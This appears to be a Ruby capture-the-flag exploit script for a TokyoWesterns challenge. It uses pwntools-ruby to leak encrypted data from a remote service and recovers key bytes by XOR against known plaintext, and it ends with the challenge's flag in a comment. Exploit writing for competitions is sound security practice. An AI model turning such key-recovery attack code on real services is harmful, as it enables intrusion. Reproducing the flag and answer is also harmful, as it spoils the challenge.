#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = 'pwn1.chal.ctf.westerns.tokyo', 16625
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = ''
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
# context.log_level = :debug
context.endian = :big
base = 0x412330
now = ARGV[0].to_i
z.write "\x00" + p32(base + now)
iv = z.gets

def xor(a, b)
  a.bytes.zip(b.bytes).map{|c,d|c^d}.pack('C*')
end

d1 = z.gets.strip.unhex
d2 = z.gets.strip.unhex
pl = 'KNOWN_PLAIN_TEXTKNOWN_PLAIN_TEXTKNOWN_PLAIN_TEXTKNOWN_PLAIN_TEXTKNOWN_PLAIN_TEXTKNOWN_PLAIN_TEXTKNOWN_PLAIN_TEXTKNOWN_PLAIN_TEXT'
d1 = xor(d1, pl)
d2 = xor(d2, pl)

i = now / 4 * 4 + 16
v = d1[i, 4].u32 - d2[i, 4].u32
v += 0x100000000 if v < 0
p v.hex
v >>= 8 * (3 - now % 4)
IO.binwrite('key' + now.to_s, '%02x' % v)
puts "#{now}: #{v.hex}"
# TWCTF{3a628f000118375a17713bed13d21685a77a612522d031e340729761e05297be}
